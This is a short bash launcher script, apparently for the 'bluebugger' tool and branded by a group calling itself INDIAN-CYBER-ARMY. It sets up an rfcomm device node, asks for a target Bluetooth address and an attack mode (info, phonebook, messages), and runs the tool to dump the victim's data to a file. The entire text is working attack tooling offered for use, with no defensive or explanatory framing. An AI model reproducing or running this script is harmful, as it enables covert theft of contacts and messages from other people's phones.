# bin/bash
apt install figlet -y
clear
mkdir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
clear
figlet -c Bluebugger
cat << EOF
                                Version : 1.2
                        Updated By : INDIAN-CYBER-ARMY 
                  YouTube : www.youtube.com/@indiancyberarmy5

EOF
read -p "SET A BLUETOOTH ADDRESS ====>" ADDR
read -p "SET ATTACK MODE(e.g info, phonebook, messages) ====>" MODE
read -p "SET OUTPUT PATH ====>" P
read -p "SET OUTPUT FILE NAME (only.txt format) ====>" N
./bluebugger -a $ADDR $MODE -c 2 -o $P$N
